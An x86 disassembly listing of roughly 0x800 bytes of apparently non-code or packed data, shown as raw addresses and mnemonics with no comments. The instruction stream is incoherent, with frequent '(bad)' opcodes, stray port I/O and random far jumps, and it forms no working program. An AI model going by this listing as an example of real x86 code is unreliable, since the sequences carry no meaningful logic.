  4367c0:	aad    0x0
  4367c2:	shl    BYTE PTR ds:[esi-0x80],0x99
  4367c7:	or     DWORD PTR [ebx+ebx*8],esi
  4367ca:	xchg   esi,eax
  4367cb:	lods   al,BYTE PTR ds:[esi]
  4367cc:	mov    ecx,edx
  4367ce:	and    cl,bh
  4367d0:	push   eax
  4367d1:	sbb    eax,0x4a14657f
  4367d6:	push   edx
  4367d7:	inc    BYTE PTR [eax+0x15]
  4367da:	enter  0x3d5d,0xe3
  4367de:	jmp    0x98b7:0x60927b87
  4367e5:	ins    BYTE PTR es:[edi],dx
  4367e6:	fwait
  4367e7:	sub    eax,0xa52d2fb8
  4367ec:	fmul   DWORD PTR [edx-0x1cc64e4d]
  4367f2:	cwde   
  4367f3:	jl     0x436836
  4367f5:	pusha  
  4367f6:	push   ds
  4367f7:	jae    0x43682f
  4367f9:	fdiv   st(0),st
  4367fb:	pop    ss
  4367fc:	ret    
  4367fd:	imul   edx,edx,0xf1ffe2f0
  436803:	cmp    BYTE PTR [ebp+0x2d],dl
  436806:	pop    ds
  436807:	add    DWORD PTR [ebx-0x2bec52e0],ecx
  43680d:	pop    ebp
  43680e:	rol    BYTE PTR [eax-0x10480677],0x50
  436815:	mov    ebp,0xec5cd48f
  43681a:	enter  0x9d34,0x92
  43681e:	sub    eax,0x9adb899c
  436823:	iret   
  436824:	mov    al,0xad
  436826:	lods   al,BYTE PTR ds:[esi]
  436827:	in     eax,0x16
  436829:	add    ah,BYTE PTR [esi]
  43682b:	jp     0x4367ad
  43682d:	xchg   edi,eax
  43682e:	jp     0x436843
  436830:	push   ebp
  436831:	neg    DWORD PTR [esi-0x77]
  436834:	out    dx,eax
  436835:	cmp    ch,ah
  436837:	std    
  436838:	(bad)
  43683b:	aad    0xde
  43683d:	clc    
  43683e:	(bad)  
  43683f:	aam    0xd
  436841:	xor    eax,0xd71ff324
  436846:	push   ds
  436847:	(bad)  [eax+0x61dcac35]
  43684d:	(bad)  
  43684f:	into   
  436850:	or     eax,DWORD PTR [eax]
  436852:	out    dx,al
  436853:	cdq    
  436854:	inc    edx
  436855:	sbb    eax,0xd288343c
  43685a:	loop   0x43683c
  43685c:	cmp    BYTE PTR [esi],bh
  43685e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43685f:	rcl    BYTE PTR [ebx+0x76],cl
  436862:	push   ecx
  436863:	(bad)  
  436864:	or     al,BYTE PTR [edx]
  436866:	out    0x15,eax
  436868:	push   edi
  436869:	add    ebp,DWORD PTR [ecx+ebx*4+0x41]
  43686d:	or     eax,0x919de80d
  436872:	pop    ds
  436873:	jg     0x4368d1
  436875:	dec    ebx
  436876:	sbb    BYTE PTR [eax+0x1a],ch
  436879:	pop    edi
  43687a:	mov    ch,0x89
  43687c:	mov    dh,0xb3
  43687e:	and    edx,edi
  436880:	inc    ebp
  436881:	inc    eax
  436882:	ficomp WORD PTR [edi+ecx*2+0x19]
  436886:	pop    ds
  436887:	popa   
  436888:	fldcw  WORD PTR [esi-0x70992aeb]
  43688e:	cld    
  43688f:	rcr    DWORD PTR [edx-0x4b],cl
  436892:	dec    ebx
  436893:	int3   
  436894:	pop    esi
  436895:	add    ebp,DWORD PTR [edi-0x4c]
  436898:	push   cs
  436899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43689a:	pusha  
  43689b:	scas   eax,DWORD PTR es:[edi]
  43689c:	adc    DWORD PTR [ebx-0x2037b4bb],ebx
  4368a2:	xchg   edx,eax
  4368a3:	stos   DWORD PTR es:[edi],eax
  4368a4:	(bad)  
  4368a6:	bound  ecx,QWORD PTR [eax]
  4368a8:	jle    0x43686d
  4368aa:	cmp    eax,0x1e6b91a6
  4368af:	fld    QWORD PTR [edi+edi*2+0x5f]
  4368b3:	loope  0x43683b
  4368b5:	xchg   ebx,eax
  4368b6:	(bad)  
  4368b7:	aad    0x68
  4368b9:	jns    0x436908
  4368bb:	in     eax,0xbe
  4368bd:	or     DWORD PTR [esi],eax
  4368bf:	ins    DWORD PTR es:[edi],dx
  4368c0:	mov    dl,0xd3
  4368c2:	jmp    DWORD PTR [ebp+0x8]
  4368c5:	push   esi
  4368c6:	out    0x67,eax
  4368c8:	pusha  
  4368c9:	ja     0x436946
  4368cb:	rcr    BYTE PTR ds:0x2ac6b483,cl
  4368d1:	pushf  
  4368d2:	jo     0x436940
  4368d4:	call   0x9924:0xc22560d6
  4368db:	sbb    cl,BYTE PTR [edx+ebx*1]
  4368de:	or     eax,DWORD PTR [ebp+esi*4-0x21fa04c3]
  4368e5:	mov    BYTE PTR [ecx+0x7f],ah
  4368e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4368e9:	lds    ecx,FWORD PTR [esi+ebp*8-0x2]
  4368ed:	loope  0x4368bf
  4368ef:	push   0xab20399
  4368f4:	inc    edi
  4368f5:	icebp  
  4368f6:	push   esp
  4368f7:	dec    eax
  4368f8:	add    esi,DWORD PTR [esi]
  4368fa:	scas   eax,DWORD PTR es:[edi]
  4368fb:	sahf   
  4368fc:	mov    ecx,esi
  4368fe:	lahf   
  4368ff:	xchg   ecx,eax
  436900:	aam    0x2b
  436902:	loopne 0x4368d9
  436904:	cmp    BYTE PTR [esi+0x74],al
  436907:	xchg   ebx,eax
  436908:	mov    ebx,0x884f09ef
  43690d:	gs xor eax,0x5a
  436911:	and    ch,BYTE PTR [edi]
  436913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436914:	jg     0x436918
  436916:	xchg   esi,eax
  436917:	stc    
  436918:	dec    esi
  436919:	pop    ebp
  43691a:	mov    bl,BYTE PTR ds:0x831e2e88
  436920:	inc    ebp
  436921:	enter  0x1b9c,0xab
  436925:	pushf  
  436926:	pop    ss
  436927:	pop    ecx
  436928:	call   0xee05:0xd6e258bf
  43692f:	dec    ebp
  436930:	(bad)  
  436931:	outs   dx,BYTE PTR ds:[esi]
  436932:	out    0x9a,al
  436934:	mov    DWORD PTR [ecx-0x32],esp
  436937:	xchg   esp,eax
  436938:	(bad)  
  43693a:	inc    edx
  43693b:	sub    edx,0xffffff8c
  43693e:	xor    eax,0xca5888bf
  436943:	dec    esp
  436944:	sbb    al,0x86
  436946:	test   DWORD PTR [edi+0x67],esp
  436949:	hlt    
  43694a:	push   ds
  43694b:	add    cl,BYTE PTR [edi+0x28d9224f]
  436951:	add    DWORD PTR cs:[edi+0x68],esi
  436955:	mov    DWORD PTR [ebp-0x2b],esp
  436958:	mov    bl,0xa8
  43695a:	dec    ebp
  43695b:	sbb    al,0xe
  43695d:	add    DWORD PTR [edx-0x505e753d],0xffffff86
  436964:	sub    DWORD PTR [esi+0x26],ebx
  436967:	jg     0x436980
  436969:	arpl   bx,dx
  43696b:	shr    DWORD PTR [edi],cl
  43696d:	add    ebx,DWORD PTR [esi-0x25]
  436970:	push   ebx
  436971:	sub    edx,esi
  436973:	mov    DWORD PTR ds:0x6bc11f10,esp
  436979:	xchg   esp,eax
  43697a:	push   edx
  43697b:	hlt    
  43697c:	(bad)  
  43697d:	loopne 0x43697f
  43697f:	xlat   BYTE PTR ds:[ebx]
  436980:	fcomi  st,st(5)
  436982:	jmp    0x43696a
  436984:	mov    cl,0x35
  436986:	out    0x75,eax
  436988:	mov    BYTE PTR [ebx],al
  43698a:	pop    esi
  43698b:	xchg   ecx,eax
  43698c:	inc    eax
  43698d:	retf   0x77e0
  436990:	or     al,BYTE PTR [ecx]
  436992:	mov    eax,0x456e1af7
  436997:	push   es
  436998:	mov    esi,0x8a1ec49a
  43699d:	add    DWORD PTR [eax+0x7e],0xac1d997b
  4369a4:	jno    0x4369d7
  4369a6:	fs cmp al,0xff
  4369a9:	out    0x60,al
  4369ab:	cmp    DWORD PTR [ecx+ebp*4-0x3b],ecx
  4369af:	push   ds
  4369b0:	js     0x436939
  4369b2:	pop    ds
  4369b3:	aas    
  4369b4:	xlat   BYTE PTR ds:[ebx]
  4369b5:	call   0xd3d1:0x1304ad4a
  4369bc:	sbb    DWORD PTR [ebx-0x6a243bf8],ecx
  4369c2:	pop    edi
  4369c3:	xor    al,0x3f
  4369c5:	stos   BYTE PTR es:[edi],al
  4369c6:	pusha  
  4369c7:	add    eax,0xa56d5cc4
  4369cc:	add    ah,0x2d
  4369cf:	xlat   BYTE PTR ds:[ebx]
  4369d0:	out    dx,al
  4369d1:	cs retf 0xce8e
  4369d5:	dec    ebp
  4369d6:	int    0x1e
  4369d8:	mov    DWORD PTR [edi],eax
  4369da:	adc    eax,0x42fa4122
  4369df:	or     al,0xe4
  4369e1:	jmp    0xb09c:0xa9e1d5fc
  4369e8:	cmp    eax,0x9407ccb1
  4369ed:	arpl   WORD PTR [esi],di
  4369ef:	jmp    0x84ee6d71
  4369f4:	fdiv   st(3),st
  4369f6:	mov    bh,0xd4
  4369f8:	xchg   esi,eax
  4369f9:	jge    0x4369ab
  4369fb:	jne    0x436a59
  4369fd:	test   BYTE PTR [esi-0x41],0x89
  436a01:	imul   eax,eax,0x8e3aa0ed
  436a07:	cmp    al,0xa
  436a09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436a0a:	inc    ecx
  436a0b:	fs ret 
  436a0d:	add    eax,0xf30fa52
  436a12:	sub    al,0x7b
  436a14:	mov    WORD PTR [edi],ss
  436a16:	inc    eax
  436a17:	int    0xf0
  436a19:	dec    esp
  436a1a:	sbb    al,0xb4
  436a1c:	xor    eax,esi
  436a1e:	push   eax
  436a1f:	lea    ecx,[eax+0x66900a95]
  436a25:	sub    edi,DWORD PTR [ebp-0x1e]
  436a28:	add    eax,DWORD PTR [eax]
  436a2a:	loopne 0x436a9c
  436a2c:	sbb    al,0xf1
  436a2e:	pop    es
  436a2f:	retf   
  436a30:	clc    
  436a31:	fisub  WORD PTR [eax+0xe]
  436a34:	mov    al,ds:0x89ae4ba9
  436a39:	jge    0x4369f7
  436a3b:	pop    edi
  436a3c:	add    al,0x26
  436a3e:	mov    BYTE PTR [ebx*8+0x7f6bd405],al
  436a45:	add    edi,eax
  436a47:	xchg   BYTE PTR [esi+0x2a7b1f81],bl
  436a4d:	mov    bl,0x3
  436a4f:	iret   
  436a50:	(bad)  
  436a51:	int3   
  436a52:	sbb    ah,dl
  436a54:	pop    eax
  436a55:	inc    esp
  436a56:	dec    ecx
  436a57:	sbb    ebx,DWORD PTR [esi]
  436a59:	xor    bh,dl
  436a5b:	xchg   esp,eax
  436a5c:	xchg   esp,eax
  436a5d:	xchg   ebp,eax
  436a5e:	jmp    0x436a4e
  436a60:	faddp  st(5),st
  436a62:	inc    bl
  436a64:	cwde   
  436a65:	push   edx
  436a66:	mov    ebp,0x8a607bd4
  436a6b:	push   bp
  436a6d:	push   ds
  436a6e:	enter  0x8af0,0x49
  436a72:	and    bh,BYTE PTR [ecx*1+0x9e42891]
  436a79:	dec    esp
  436a7a:	test   DWORD PTR [edx],eax
  436a7c:	in     al,0x26
  436a7e:	clc    
  436a7f:	or     dl,cl
  436a81:	in     eax,0x17
  436a83:	aam    0x60
  436a85:	mov    DWORD PTR [edx+0x13410fdf],ebp
  436a8b:	xchg   ebp,eax
  436a8c:	mov    DWORD PTR ds:0x8a20312f,ebx
  436a92:	xchg   DWORD PTR [ecx+0x320c0322],eax
  436a98:	and    bl,BYTE PTR [eax+0x1089fb27]
  436a9e:	pop    ds
  436a9f:	xchg   edi,eax
  436aa0:	cmp    esi,edx
  436aa2:	outs   dx,BYTE PTR ds:[esi]
  436aa3:	mov    esp,eax
  436aa5:	shr    BYTE PTR ds:0xc774c3d1,0x3b
  436aac:	cmp    al,0xf8
  436aae:	inc    esi
  436aaf:	xor    eax,0x9958948a
  436ab4:	fs dec esi
  436ab6:	lahf   
  436ab7:	neg    BYTE PTR [si+0x39ec]
  436abc:	cmp    al,BYTE PTR [ebx]
  436abe:	call   0xdefc36b3
  436ac3:	push   0xffffffc0
  436ac5:	mov    BYTE PTR [edi],bl
  436ac7:	sbb    eax,ebp
  436ac9:	push   ss
  436aca:	push   esp
  436acb:	les    eax,FWORD PTR [edx+ebx*1]
  436ace:	pop    ebx
  436acf:	aad    0x9b
  436ad1:	rol    DWORD PTR [ebx-0x3061c341],cl
  436ad7:	mov    DWORD PTR [eax+0x7a7e8f],ecx
  436add:	and    bl,bl
  436adf:	cmp    DWORD PTR [ebp+0x190dbb92],eax
  436ae5:	push   0x1f
  436ae7:	cmp    esi,eax
  436ae9:	xchg   ecx,eax
  436aea:	cmp    eax,0x1fd268d3
  436aef:	mov    DWORD PTR [esi],esi
  436af1:	enter  0xee39,0xe
  436af5:	mov    bl,0xf7
  436af7:	aam    0x64
  436af9:	or     eax,0xc4e7b2b0
  436afe:	mov    edx,0xdb4f896d
  436b03:	outs   dx,BYTE PTR ds:[esi]
  436b04:	xchg   ecx,eax
  436b05:	call   0x4604:0x1ecb4a4
  436b0c:	out    0xdd,eax
  436b0e:	cdq    
  436b0f:	rol    DWORD PTR [edi-0x2e48cd1c],1
  436b15:	(bad)  
  436b17:	push   esp
  436b18:	jp     0x436b5a
  436b1a:	ins    BYTE PTR es:[edi],dx
  436b1b:	out    dx,eax
  436b1c:	ins    DWORD PTR es:[edi],dx
  436b1d:	jns    0x436ac1
  436b1f:	jne    0x436b4a
  436b21:	lahf   
  436b22:	sbb    DWORD PTR [ebx],ebx
  436b24:	inc    ecx
  436b25:	add    ecx,esp
  436b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436b28:	adc    al,0x3d
  436b2a:	push   ds
  436b2b:	push   esi
  436b2c:	iret   
  436b2d:	mov    eax,0x4bda760
  436b32:	mul    edx
  436b34:	imul   BYTE PTR [esi+0x5d9dbac0]
  436b3a:	jge    0x436ba5
  436b3c:	andnps xmm1,XMMWORD PTR ds:0x4992f9c8
  436b43:	xor    esi,ebp
  436b45:	mov    bl,0xf1
  436b47:	aam    0xa6
  436b49:	mov    ds:0x77e8db7a,eax
  436b4e:	(bad)  
  436b50:	xchg   esp,eax
  436b51:	xor    ch,cl
  436b53:	dec    edi
  436b54:	jnp    0x436b84
  436b56:	dec    eax
  436b57:	lock cmp BYTE PTR [eax],dl
  436b5a:	add    al,0xd4
  436b5c:	jne    0x436b1b
  436b5e:	xor    DWORD PTR [esi-0x38],eax
  436b61:	rol    edx,cl
  436b63:	aad    0x8b
  436b65:	sbb    al,0xf8
  436b67:	add    DWORD PTR [eax-0x213e2f8],ebp
  436b6d:	lds    esi,FWORD PTR [edx-0xcd5f12b]
  436b73:	jle    0x5bfce089
  436b79:	fwait
  436b7a:	xchg   ebp,eax
  436b7b:	fnstenv [edi+0x10f72d94]
  436b81:	and    edx,DWORD PTR [edi-0x31]
  436b84:	(bad)  
  436b86:	pusha  
  436b87:	mov    edi,0x77e6e191
  436b8c:	xor    al,0x5
  436b8e:	fwait
  436b8f:	aad    0x43
  436b91:	xchg   ecx,eax
  436b92:	loop   0x436b95
  436b94:	call   0x8f3cf1ff
  436b99:	aaa    
  436b9a:	in     eax,dx
  436b9b:	adc    al,0x96
  436b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436b9e:	int3   
  436b9f:	and    eax,0x9cac6810
  436ba4:	mov    BYTE PTR [eax+esi*1-0x67ac0cac],bh
  436bab:	test   BYTE PTR [ebp+0x2a3b6ee4],al
  436bb1:	ror    DWORD PTR [ecx-0x3bc370b],0xa6
  436bb8:	xor    BYTE PTR [edx+0xdb34290],bh
  436bbe:	loope  0x436b95
  436bc0:	xor    eax,0xb9eddfbf
  436bc5:	jge    0x436c23
  436bc7:	mov    edi,0xc09e2185
  436bcc:	retf   0x34a
  436bcf:	out    dx,eax
  436bd0:	gs push edi
  436bd2:	ss ds mov ch,0x86
  436bd6:	pop    ds
  436bd7:	jmp    0x3e6be63e
  436bdc:	fld    st(1)
  436bde:	jnp    0x436c5d
  436be0:	(bad)  
  436be1:	mov    DWORD PTR [eax+0x5ec04614],edi
  436be7:	jg     0x436bf8
  436be9:	add    dl,BYTE PTR [ecx+ebp*1+0x2c3abaec]
  436bf0:	fdivr  DWORD PTR [esi]
  436bf2:	test   DWORD PTR ds:0x969c02a0,0x17f83dfa
  436bfc:	sub    DWORD PTR [ecx],edx
  436bfe:	retf   0x9408
  436c01:	sar    BYTE PTR [ebp+0x1a],1
  436c04:	or     edx,DWORD PTR [edi-0x1c8b1517]
  436c0a:	adc    edx,DWORD PTR [edi-0x6b9c9677]
  436c10:	dec    esp
  436c11:	loopne 0x436c62
  436c13:	mov    ah,BYTE PTR [eax]
  436c15:	add    bh,BYTE PTR [eax+ecx*8+0x41ed1443]
  436c1c:	fisttp WORD PTR [edx-0x54be5a9d]
  436c22:	sbb    al,BYTE PTR [esp-0x64]
  436c26:	push   edi
  436c27:	push   ebp
  436c28:	out    0x0,eax
  436c2a:	sub    BYTE PTR [edx-0x71],bl
  436c2d:	adc    ebp,DWORD PTR [ecx+0x27]
  436c30:	fwait
  436c31:	mov    ebp,0xdc38d4e5
  436c36:	mov    eax,ds:0x4859893f
  436c3b:	retf   
  436c3c:	dec    eax
  436c3d:	sbb    edi,0xffffffab
  436c40:	mov    al,ds:0x53d5b8f2
  436c45:	xchg   DWORD PTR [ecx+0x276dd813],ebx
  436c4b:	sub    DWORD PTR [ecx+0x2e7a05a1],ecx
  436c51:	popa   
  436c52:	stc    
  436c53:	rcl    BYTE PTR [ebx+eax*1+0x78],1
  436c57:	pop    ebx
  436c58:	fwait
  436c59:	pop    edi
  436c5a:	loope  0x436c56
  436c5c:	adc    BYTE PTR [edi-0x3ec3b49a],cl
  436c62:	fcomp  st(0)
  436c64:	data16 loop 0x436c73
  436c67:	sub    al,bh
  436c69:	lahf   
  436c6a:	mov    BYTE PTR [esp+ebx*2-0x5235b02f],bl
  436c71:	inc    ebx
  436c72:	gs cmp ecx,edi
  436c75:	ret    0x8110
  436c78:	mov    ebp,0xfa809f2b
  436c7d:	imul   esi,DWORD PTR ds:0x8626d7d4,0x6cc790ee
  436c87:	lods   eax,DWORD PTR ds:[esi]
  436c88:	xchg   bl,al
  436c8a:	mov    DWORD PTR [edx+0x7d05d0fe],eax
  436c90:	mov    ecx,0xb02960d4
  436c95:	pop    edi
  436c96:	not    ch
  436c98:	jmp    0x438f:0x664b9518
  436c9f:	js     0x436c2c
  436ca1:	mov    ecx,0x1b60827a
  436ca6:	icebp  
  436ca7:	clc    
  436ca8:	push   cs
  436ca9:	cmp    eax,0x53cc746f
  436cae:	repz aad 0x65
  436cb1:	(bad)  
  436cb2:	out    0x6e,eax
  436cb4:	popa   
  436cb5:	jle    0x436cc7
  436cb7:	ja     0x436c92
  436cb9:	or     edx,0x2a4989bd
  436cbf:	cmc    
  436cc0:	sbb    BYTE PTR [ebx+eiz*8-0x25fd351f],dl
  436cc7:	and    DWORD PTR [edx+ebp*2-0x5473b2b9],eax
  436cce:	imul   ecx,ebx,0xe2293001
  436cd4:	or     DWORD PTR [ecx],ebx
  436cd6:	sub    ebx,esi
  436cd8:	cmp    al,0x2
  436cda:	sbb    cl,bh
  436cdc:	mov    ebx,DWORD PTR [esi+0x3]
  436cdf:	inc    BYTE PTR [edi]
  436ce1:	xor    al,0x1f
  436ce3:	xor    eax,0x18ca0df5
  436ce8:	in     eax,dx
  436ce9:	int    0x4a
  436ceb:	pop    edi
  436cec:	add    esp,DWORD PTR [ebp+0x1f]
  436cef:	mov    eax,0xe8aba499
  436cf4:	mov    eax,0x11797e91
  436cf9:	pop    edx
  436cfa:	jns    0x436d10
  436cfc:	ret    0x9caa
  436cff:	dec    ecx
  436d00:	xor    eax,0xda7a0a26
  436d05:	cmp    BYTE PTR [esi],bl
  436d07:	rcr    BYTE PTR [ebx+eiz*1-0x4e],0xe4
  436d0c:	stc    
  436d0d:	iret   
  436d0e:	scas   al,BYTE PTR es:[edi]
  436d0f:	aad    0x9b
  436d11:	xchg   esp,eax
  436d12:	xor    eax,0xce4048e4
  436d17:	aam    0x7f
  436d19:	dec    DWORD PTR [eax]
  436d1b:	mov    ah,0xda
  436d1d:	sbb    BYTE PTR [esi-0x62],dh
  436d20:	mov    dh,0x71
  436d22:	dec    esp
  436d23:	outs   dx,DWORD PTR ds:[esi]
  436d24:	or     DWORD PTR [ecx-0x4d171d1e],ecx
  436d2a:	fcmovnbe st,st(5)
  436d2c:	xchg   DWORD PTR [edi+0x2c31dfa0],ebp
  436d32:	neg    BYTE PTR [edx-0x77]
  436d35:	aas    
  436d36:	add    eax,ebp
  436d38:	cli    
  436d39:	xchg   ecx,eax
  436d3a:	or     DWORD PTR [esp+ecx*8],esi
  436d3d:	add    ecx,eax
  436d3f:	(bad)  
  436d41:	push   0x92e7ec40
  436d46:	ss add eax,0x86927989
  436d4c:	mov    esp,0x11ba700e
  436d51:	add    bh,BYTE PTR [esi-0x38127e86]
  436d57:	cmc    
  436d58:	outs   dx,BYTE PTR ds:[esi]
  436d59:	test   al,0x1f
  436d5b:	test   DWORD PTR [edi],ebp
  436d5d:	add    bh,BYTE PTR [edi]
  436d5f:	sbb    DWORD PTR [eax+esi*8],edx
  436d62:	sbb    esp,edx
  436d64:	(bad)  
  436d65:	enter  0x2024,0xd5
  436d69:	pop    ecx
  436d6a:	sub    ah,BYTE PTR [eax-0x5171ec77]
  436d70:	dec    ecx
  436d71:	xor    ebx,esp
  436d73:	jae    0x436d56
  436d75:	jne    0x436d63
  436d77:	mov    BYTE PTR [di],dl
  436d7a:	sub    eax,0xbbeb7f29
  436d7f:	xor    ecx,DWORD PTR [ecx-0x63b5fce9]
  436d85:	mov    edx,0x6ac15abe
  436d8a:	es and eax,0xefa605c4
  436d90:	fadd   DWORD PTR [ecx+0x7389d7d6]
  436d96:	ds cwde 
  436d98:	cmp    DWORD PTR [edi+0x35c1349],edi
  436d9e:	int3   
  436d9f:	mov    bl,0xe
  436da1:	ror    DWORD PTR [ecx-0xe],cl
  436da4:	push   esp
  436da5:	jne    0x436e0d
  436da7:	shl    esi,1
  436da9:	xchg   edi,eax
  436daa:	xchg   edi,eax
  436dab:	lds    ecx,FWORD PTR [ecx-0x7a1c55c2]
  436db1:	sbb    al,0xe2
  436db3:	xchg   ecx,eax
  436db4:	fadd   QWORD PTR [esi-0x20c6ffe1]
  436dba:	push   ss
  436dbb:	cmp    cl,BYTE PTR [eax+0x72b05bcd]
  436dc1:	pop    ds
  436dc2:	cs dec ecx
  436dc4:	add    al,BYTE PTR gs:[edx+0x6dd26f3e]
  436dcb:	mov    esp,0x4d608f3f
  436dd0:	scas   eax,DWORD PTR es:[edi]
  436dd1:	lods   eax,DWORD PTR ds:[esi]
  436dd2:	inc    ecx
  436dd3:	xchg   BYTE PTR [edx],bl
  436dd5:	dec    eax
  436dd6:	enter  0x4dd7,0xec
  436dda:	test   al,0x92
  436ddc:	xor    al,0x99
  436dde:	dec    esi
  436ddf:	sbb    al,0x71
  436de1:	sbb    DWORD PTR [ecx-0x31],esp
  436de4:	push   eax
  436de5:	js     0x436da2
  436de7:	sub    al,0xfa
  436de9:	mov    edi,0x618a50da
  436dee:	push   edi
  436def:	sub    eax,0x491e1887
  436df4:	dec    eax
  436df5:	mov    ebx,0xb3f23b80
  436dfa:	pop    ebp
  436dfb:	aad    0x9b
  436dfd:	mov    eax,ds:0x81a28995
  436e02:	(bad)  
  436e03:	or     ecx,DWORD PTR [ecx+0x401d98a9]
  436e09:	mov    ds,WORD PTR [ecx+0x49]
  436e0c:	rol    DWORD PTR ds:0x38d0e244,0x8f
  436e13:	je     0x436df3
  436e15:	shl    DWORD PTR [eax+0x3d],cl
  436e18:	lods   al,BYTE PTR ds:[esi]
  436e19:	push   esi
  436e1a:	xchg   esi,eax
  436e1b:	test   al,0x16
  436e1d:	push   edx
  436e1e:	lock aam 0x10
  436e21:	cwde   
  436e22:	adc    ebx,DWORD PTR [eax+0x3e]
  436e25:	cmp    eax,0x9c7f1062
  436e2a:	pusha  
  436e2b:	add    eax,0x60348297
  436e30:	in     al,0x11
  436e32:	aaa    
  436e33:	aam    0xf8
  436e35:	inc    ebx
  436e36:	out    dx,eax
  436e37:	cmp    bl,BYTE PTR [edx]
  436e39:	jl     0x436dfc
  436e3b:	xchg   esp,eax
  436e3c:	push   esp
  436e3d:	shr    DWORD PTR [ebp+0x35],cl
  436e40:	add    DWORD PTR [edx],edx
  436e42:	jl     0x436e58
  436e44:	jmp    0x57557763
  436e49:	add    dh,dl
  436e4b:	(bad)  
  436e4c:	loope  0x436e9e
  436e4e:	pop    ss
  436e4f:	dec    edi
  436e50:	es push cs
  436e52:	outs   dx,BYTE PTR ds:[esi]
  436e53:	pop    ebx
  436e54:	mov    ah,0xc8
  436e56:	mov    eax,ds:0xdb1ba81f
  436e5b:	dec    eax
  436e5c:	stc    
  436e5d:	pop    ss
  436e5e:	add    dl,dl
  436e60:	test   DWORD PTR [edi+0x47d6f72a],edx
  436e66:	mov    ds:0x962bd0a1,eax
  436e6b:	lds    edx,FWORD PTR [ebp-0x4b28ec77]
  436e71:	push   ds
  436e72:	cmp    eax,0xec05d8db
  436e77:	in     eax,0x82
  436e79:	lea    ecx,ds:[esi+0x1f60c06a]
  436e80:	dec    eax
  436e81:	call   0xd5a4:0x377864cd
  436e88:	das    
  436e89:	fadd   st,st(2)
  436e8b:	jae    0x436e4d
  436e8d:	cmp    BYTE PTR [eax-0x5566774e],al
  436e93:	adc    cl,BYTE PTR [esi-0x6995a37a]
  436e99:	add    eax,0x52bd5336
  436e9e:	fist   DWORD PTR [ebx]
  436ea0:	sub    edi,DWORD PTR [edi-0x1717209f]
  436ea6:	adc    al,0x41
  436ea8:	pop    edi
  436ea9:	gs out 0x8c,eax
  436eac:	aam    0x14
  436eae:	inc    esi
  436eaf:	retf   
  436eb0:	mov    bl,BYTE PTR [esi]
  436eb2:	stc    
  436eb3:	mov    esi,DWORD PTR [eax-0x612cdd9e]
  436eb9:	add    al,0x60
  436ebb:	lods   eax,DWORD PTR ds:[esi]
  436ebc:	cli    
  436ebd:	inc    edi
  436ebe:	pushf  
  436ebf:	sbb    eax,0xa66fd830
  436ec4:	mov    dl,0x32
  436ec6:	push   0xfffffffc
  436ec8:	xchg   BYTE PTR [eax],cl
  436eca:	not    ch
  436ecc:	mov    ebp,0x88ce2113
  436ed1:	(bad)
  436ed4:	sub    BYTE PTR [edx+0x5b29c3a],ch
  436eda:	repnz pop edi
  436edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436edd:	ror    eax,1
  436edf:	iret   
  436ee0:	pop    ecx
  436ee1:	pusha  
  436ee2:	pop    ds
  436ee3:	cdq    
  436ee4:	(bad)  [edi]
  436ee6:	mov    bh,0xf4
  436ee8:	enter  0x1d8a,0xd7
  436eec:	push   eax
  436eed:	pop    esp
  436eee:	imul   ebp,DWORD PTR [esi],0x74
  436ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436ef2:	mov    eax,ds:0x1ffd51a8
  436ef7:	mov    ds:0x2fa584ed,eax
  436efc:	xchg   edx,eax
  436efd:	push   esp
  436efe:	jg     0x436ed7
  436f00:	mov    ebp,0xf0b70a39
  436f05:	add    DWORD PTR [ebx-0x13],esi
  436f08:	js     0x436f56
  436f0a:	push   0xbd699897
  436f0f:	mov    bl,0x8
  436f11:	repz or al,0x50
  436f14:	stc    
  436f15:	add    dl,dh
  436f17:	or     al,0x32
  436f19:	dec    ebp
  436f1a:	mov    ecx,0x1f007fed
  436f1f:	aad    0x9e
  436f21:	shl    BYTE PTR [edx],1
  436f23:	clc    
  436f24:	adc    al,ah
  436f26:	xchg   ch,dl
  436f28:	cmp    al,0x8a
  436f2a:	xchg   esp,eax
  436f2b:	jp     0x436f73
  436f2d:	mov    ebx,0xe79f1899
  436f32:	xor    eax,0xed02a992
  436f37:	xor    edi,DWORD PTR [esi+0x11d4fc9d]
  436f3d:	ja     0x436f81
  436f3f:	test   DWORD PTR [ecx],ebx
  436f41:	inc    eax
  436f42:	ret    0x6ed3
  436f45:	clc    
  436f46:	push   edi
  436f47:	mov    ds:0x336094ee,eax
  436f4c:	popa   
  436f4d:	xchg   DWORD PTR ds:[edi+0x58],ebp
  436f51:	adc    eax,0x8c51f002
  436f56:	push   cs
  436f57:	aam    0x8f
  436f59:	(bad)  
  436f5a:	aam    0xed
  436f5c:	mov    DWORD PTR [ecx-0x52],ecx
  436f5f:	push   DWORD PTR [esi-0x7ba06454]
  436f65:	bound  edx,QWORD PTR [ecx]
  436f67:	xlat   BYTE PTR ds:[ebx]
  436f68:	adc    dl,al
  436f6a:	imul   esi,DWORD PTR [ecx-0x8],0xffffff81
  436f6e:	mov    esp,0x190238a5
  436f73:	aam    0x46
  436f75:	scas   eax,DWORD PTR es:[edi]
  436f76:	pop    es
  436f77:	jge    0x436f0d
  436f79:	jecxz  0x436fe4
  436f7b:	test   eax,0x4885a3a8
  436f80:	pop    ss
  436f81:	pop    esi
  436f82:	pushf  
  436f83:	jmp    0x753a8445
  436f88:	xchg   esp,eax
  436f89:	xchg   edx,eax
  436f8a:	jmp    FWORD PTR [esi+0x2]
  436f8d:	jo     0x436fbd
  436f8f:	(bad)  
  436f90:	sar    BYTE PTR [ebx+0x2d],cl
  436f93:	sbb    ch,dl
  436f95:	lea    edx,[esi]
  436f97:	out    0x8e,eax
  436f99:	mov    eax,0x4a0f4561
  436f9e:	push   edx
  436f9f:	sbb    esp,eax
  436fa1:	mov    dh,0xd3
  436fa3:	push   eax
  436fa4:	mov    eax,ds:0x47d6b126
  436fa9:	enter  0x599a,0x4a
  436fad:	popa   
  436fae:	in     al,dx
  436faf:	jb     0x436fc5
  436fb1:	shr    DWORD PTR [esi+edx*4+0x1660034b],cl
  436fb8:	mov    WORD PTR [edx-0x11],ss
  436fbb:	sbb    BYTE PTR [esi],0xff
